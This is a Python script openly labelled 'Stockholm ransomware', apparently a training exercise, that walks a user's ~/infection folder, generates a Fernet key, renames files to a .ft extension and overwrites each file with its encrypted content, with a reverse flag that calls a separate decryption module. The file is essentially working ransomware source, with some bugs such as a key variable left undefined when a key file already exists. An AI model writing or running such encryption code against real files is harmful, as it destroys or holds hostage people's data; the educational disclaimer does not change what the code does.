#!/usr/bin/env python3
import argparse
from distutils.command.clean import clean
from email import parser
from multiprocessing.connection import wait
import os
from time import sleep
from cryptography.fernet import Fernet
from getpass import getuser
from text_art import stockholm, rev_stockholm, decrypting, encrypting, lil_stockholm, text_reverse, salecler
from reverse import decrypting

# Target default directory
user = getuser()
userdir = '/home/'+user
default_dir = '/home/'+user+'/infection'
#files[] will be imported from checking
scanned_dir = []
scanned_files = []
encrypted_files = []

# Main
print("bonjour")
parser = argparse.ArgumentParser(
    description= """ *** STOCKHOLM RANSOMWARE ***
        
        Encrypt and decrypt all files and subdirectories.
        It also change the extension of each file.
        *** WARNING: This program was written for educational purposes.  
        The responsibility for the use and distribution of the tool lies with 
        the user. Use it at your own risk and enjoy! - salecler """
)
# Version mode
parser.add_argument('-v', '--version', action='store_true', help="show program's version.")
# Reverse mode
parser.add_argument('-r', '--reverse', action='store_true', help="decrypt all files and directories and change back extension's name.")

# Files that will be encrypted
for path, currentDirectory, files in os.walk("/home/"+user+"/infection"):
    for dir in currentDirectory:
        scanned_dir.append(dir)
    for file in files:
        scanned_files.append(file)
    # Create key
if not os.path.isfile("key.key"):
    key = Fernet.generate_key()
    with open("key.key", "wb") as thekey:
        thekey.write(key)
    # Rename files
for archive in os.listdir(default_dir):
    if archive == "stockholm.py":
        continue
    if os.path.isfile(archive):
        base = os.path.splitext(archive)[0]
        os.rename(archive, base + '.ft')
    # Encrypt files
args = parser.parse_args()
if args.reverse == False and args.version == False: 
    os.chdir(default_dir)
    actual_dir = os.getcwd()
    print(actual_dir)
    for archive in scanned_files:
        encrypted_files.append(archive)
        with open(archive, "rb") as thefile:
            content = thefile.read();
        encrypted_content = Fernet(key).encrypt(content)
        with open(archive, "wb") as thefile:
            thefile.write(encrypted_content)

if args.version == True:
    os.system("clear")
    print(lil_stockholm)
    print("Version 1.1 - ", salecler)
if args.reverse == True:
    #text_reverse()
    decrypting()

    
